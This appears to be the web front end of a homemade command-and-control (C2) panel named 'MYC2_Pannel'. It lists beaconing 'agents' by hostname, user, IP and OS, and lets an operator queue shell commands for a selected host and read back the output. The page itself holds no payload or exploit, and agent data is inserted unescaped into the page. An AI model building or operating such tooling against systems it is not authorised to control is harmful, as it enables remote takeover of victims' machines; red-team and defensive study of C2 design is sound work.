<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MYC2_Pannel</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
    <style>
        :root {
            --bg-dark: #0f172a;
            --panel-bg: #1e293b;
            --accent: #38bdf8;
            --text-main: #f8fafc;
            --text-muted: #94a3b8;
            --term-bg: #020617;
            --term-text: #10b981;
            --border: #334155;
            --hover: #2dd4bf;
        }

        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }

        body {
            font-family: 'Inter', sans-serif;
            background-color: var(--bg-dark);
            color: var(--text-main);
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }

        header {
            background: linear-gradient(90deg, #1e293b 0%, #0f172a 100%);
            padding: 1.5rem 2rem;
            border-bottom: 1px solid var(--border);
            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1);
        }

        header h1 {
            font-size: 1.5rem;
            font-weight: 600;
            color: var(--accent);
            letter-spacing: 0.5px;
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .container {
            display: flex;
            flex: 1;
            padding: 2rem;
            gap: 2rem;
            max-width: 1400px;
            margin: 0 auto;
            width: 100%;
        }

        .sidebar {
            width: 300px;
            background: var(--panel-bg);
            border-radius: 12px;
            border: 1px solid var(--border);
            display: flex;
            flex-direction: column;
            overflow: hidden;
            box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.1);
        }

        .sidebar-header {
            padding: 1.25rem;
            background: rgba(255, 255, 255, 0.02);
            border-bottom: 1px solid var(--border);
            font-weight: 600;
            color: var(--text-muted);
            text-transform: uppercase;
            font-size: 0.85rem;
            letter-spacing: 1px;
        }

        .agent-list {
            flex: 1;
            overflow-y: auto;
            padding: 0.5rem;
        }

        .agent-item {
            padding: 1rem;
            border-radius: 8px;
            cursor: pointer;
            transition: all 0.2s ease;
            margin-bottom: 0.5rem;
            border: 1px solid transparent;
        }

        .agent-item:hover {
            background: rgba(56, 189, 248, 0.1);
            border-color: rgba(56, 189, 248, 0.2);
        }

        .agent-item.active {
            background: rgba(56, 189, 248, 0.15);
            border-color: var(--accent);
        }

        .agent-name {
            font-weight: 600;
            margin-bottom: 0.25rem;
        }

        .agent-meta {
            font-size: 0.8rem;
            color: var(--text-muted);
            display: flex;
            justify-content: space-between;
        }

        .status-dot {
            display: inline-block;
            width: 8px;
            height: 8px;
            background: #10b981;
            border-radius: 50%;
            margin-right: 6px;
            box-shadow: 0 0 8px #10b981;
        }

        .main-panel {
            flex: 1;
            display: flex;
            flex-direction: column;
            background: var(--panel-bg);
            border-radius: 12px;
            border: 1px solid var(--border);
            overflow: hidden;
            box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.1);
        }

        .panel-header {
            padding: 1.25rem;
            border-bottom: 1px solid var(--border);
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .terminal-container {
            flex: 1;
            background: var(--term-bg);
            padding: 1.5rem;
            overflow-y: auto;
            font-family: 'JetBrains Mono', monospace;
            font-size: 0.9rem;
            line-height: 1.5;
            color: var(--term-text);
            display: flex;
            flex-direction: column;
        }

        .terminal-block {
            margin-bottom: 1.5rem;
        }

        .term-cmd {
            color: var(--accent);
            margin-bottom: 0.5rem;
        }
        
        .term-cmd::before {
            content: "➜  ~ ";
            color: #f43f5e;
        }

        .term-out {
            white-space: pre-wrap;
            color: #e2e8f0;
        }
        
        .term-time {
            color: #64748b;
            font-size: 0.75rem;
            margin-top: 0.25rem;
        }

        .command-bar {
            padding: 1.25rem;
            background: rgba(255, 255, 255, 0.02);
            border-top: 1px solid var(--border);
            display: flex;
            gap: 1rem;
        }

        .cmd-input {
            flex: 1;
            background: var(--term-bg);
            border: 1px solid var(--border);
            color: var(--text-main);
            padding: 0.75rem 1rem;
            border-radius: 6px;
            font-family: 'JetBrains Mono', monospace;
            font-size: 0.95rem;
            outline: none;
            transition: border-color 0.2s;
        }

        .cmd-input:focus {
            border-color: var(--accent);
            box-shadow: 0 0 0 2px rgba(56, 189, 248, 0.2);
        }

        .btn-send {
            background: var(--accent);
            color: #0f172a;
            border: none;
            padding: 0 1.5rem;
            border-radius: 6px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.2s;
        }

        .btn-send:hover {
            background: var(--hover);
            transform: translateY(-1px);
        }

        .btn-send:active {
            transform: translateY(0);
        }

        .empty-state {
            display: flex;
            align-items: center;
            justify-content: center;
            height: 100%;
            color: var(--text-muted);
            font-size: 1.1rem;
            flex-direction: column;
            gap: 1rem;
        }
        
        .pulse {
            animation: pulse-animation 2s infinite;
        }

        @keyframes pulse-animation {
            0% { transform: scale(0.95); box-shadow: 0 0 0 0 rgba(16, 185, 129, 0.7); }
            70% { transform: scale(1); box-shadow: 0 0 0 6px rgba(16, 185, 129, 0); }
            100% { transform: scale(0.95); box-shadow: 0 0 0 0 rgba(16, 185, 129, 0); }
        }
    </style>
</head>
<body>

    <header>
        <h1>
            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 2v20M17 5H9.5a3.5 3.5 0 0 0 0 7h5a3.5 3.5 0 0 1 0 7H6"/></svg>
            MYC2_Pannel
        </h1>
    </header>

    <div class="container">
        <aside class="sidebar">
            <div class="sidebar-header">
                Active Agents
            </div>
            <div class="agent-list" id="agentList">
                <div class="empty-state" style="font-size: 0.9rem;">Waiting for beacons...</div>
            </div>
        </aside>

        <main class="main-panel">
            <div class="panel-header" id="panelHeader">
                <div>
                    <h2 style="font-size: 1.1rem;">Select an agent</h2>
                    <span style="font-size: 0.8rem; color: var(--text-muted);">No agent selected</span>
                </div>
            </div>

            <div class="terminal-container" id="terminal">
                <div class="empty-state">
                    <svg width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1" stroke-linecap="round" stroke-linejoin="round" style="opacity: 0.5"><rect x="2" y="3" width="20" height="14" rx="2" ry="2"></rect><line x1="8" y1="21" x2="16" y2="21"></line><line x1="12" y1="17" x2="12" y2="21"></line></svg>
                    <span>Select an agent from the sidebar to view its terminal</span>
                </div>
            </div>

            <div class="command-bar">
                <input type="text" class="cmd-input" id="cmdInput" placeholder="Enter shell command..." disabled>
                <button class="btn-send" id="btnSend" disabled>EXECUTE</button>
            </div>
        </main>
    </div>

    <script>
        let currentAgentId = null;
        let knownAgents = {};

        // Fetch agents periodically
        async function pollAgents() {
            try {
                const res = await fetch('/api/agents');
                const agents = await res.json();
                
                const list = document.getElementById('agentList');
                if (agents.length === 0) return;
                
                if (Object.keys(knownAgents).length === 0) list.innerHTML = '';
                
                agents.forEach(agent => {
                    knownAgents[agent.agent_id] = agent;
                    
                    let el = document.getElementById(`agent-${agent.agent_id}`);
                    if (!el) {
                        el = document.createElement('div');
                        el.id = `agent-${agent.agent_id}`;
                        el.className = 'agent-item';
                        if(currentAgentId === agent.agent_id) el.classList.add('active');
                        
                        el.onclick = () => selectAgent(agent.agent_id);
                        list.appendChild(el);
                    }
                    
                    el.innerHTML = `
                        <div class="agent-name"><span class="status-dot pulse"></span> ${agent.hostname}</div>
                        <div class="agent-meta">
                            <span>${agent.user} @ ${agent.ip}</span>
                            <span>${agent.os}</span>
                        </div>
                        <div class="agent-meta" style="margin-top:4px; font-size:0.7rem; color:#64748b;">
                            Last seen: ${agent.last_seen}
                        </div>
                    `;
                });
            } catch (e) {
                console.error("Failed to fetch agents", e);
            }
        }

        function selectAgent(id) {
            currentAgentId = id;
            
            // Update UI styles
            document.querySelectorAll('.agent-item').forEach(el => el.classList.remove('active'));
            document.getElementById(`agent-${id}`).classList.add('active');
            
            // Enable inputs
            document.getElementById('cmdInput').disabled = false;
            document.getElementById('btnSend').disabled = false;
            document.getElementById('cmdInput').focus();
            
            // Update header
            const agent = knownAgents[id];
            document.getElementById('panelHeader').innerHTML = `
                <div>
                    <h2 style="font-size: 1.1rem; color: var(--accent);">${agent.hostname}</h2>
                    <span style="font-size: 0.8rem; color: var(--text-muted);">${agent.agent_id}</span>
                </div>
                <div style="font-size: 0.8rem; background: rgba(255,255,255,0.1); padding: 4px 8px; border-radius: 4px;">
                    ${agent.os}
                </div>
            `;
            
            pollResults();
        }

        async function pollResults() {
            if (!currentAgentId) return;
            try {
                const res = await fetch(`/api/results/${currentAgentId}`);
                const results = await res.json();
                
                const term = document.getElementById('terminal');
                
                if (results.length === 0) {
                    if (!term.innerHTML.includes('Queued')) {
                        term.innerHTML = '<div style="color: #64748b; font-style: italic;">No commands executed yet.</div>';
                    }
                    return;
                }
                
                let html = '';
                results.forEach(r => {
                    html += `
                        <div class="terminal-block">
                            <div class="term-cmd">${r.command}</div>
                            <div class="term-out">${r.output}</div>
                            <div class="term-time">${r.timestamp}</div>
                        </div>
                    `;
                });
                
                // Keep 'queued' block if a command was sent but result not yet received
                const isWaiting = term.innerHTML.includes('Queued, waiting');
                if (isWaiting) {
                    const queuedCmd = term.querySelector('.terminal-block[style*="opacity"]').outerHTML;
                    // Check if the queued command is not the last result
                    const lastResultCmd = results.length > 0 ? results[results.length-1].command : '';
                    const waitingCmdText = term.querySelector('.terminal-block[style*="opacity"] .term-cmd').innerText;
                    
                    if (lastResultCmd !== waitingCmdText) {
                         html += queuedCmd;
                    }
                }
                
                // Only update if changed
                if (term.innerHTML !== html) {
                    term.innerHTML = html;
                    term.scrollTop = term.scrollHeight;
                }
                
            } catch (e) {
                console.error("Failed to fetch results", e);
            }
        }

        async function sendCommand() {
            if (!currentAgentId) return;
            
            const input = document.getElementById('cmdInput');
            const cmd = input.value.trim();
            if (!cmd) return;
            
            input.value = '';
            
            const term = document.getElementById('terminal');
            if (term.innerHTML.includes('No commands executed yet')) term.innerHTML = '';
            
            term.innerHTML += `
                <div class="terminal-block" style="opacity: 0.7;">
                    <div class="term-cmd">${cmd}</div>
                    <div class="term-out" style="color: #64748b; font-style: italic;">Queued, waiting for agent beacon...</div>
                </div>
            `;
            term.scrollTop = term.scrollHeight;

            try {
                await fetch(`/api/command/${currentAgentId}`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ command: cmd })
                });
            } catch (e) {
                alert("Failed to send command");
            }
        }

        document.getElementById('btnSend').onclick = sendCommand;
        document.getElementById('cmdInput').onkeypress = (e) => {
            if (e.key === 'Enter') sendCommand();
        };

        setInterval(pollAgents, 3000);
        setInterval(pollResults, 3000);
        pollAgents();
    </script>
</body>
</html>
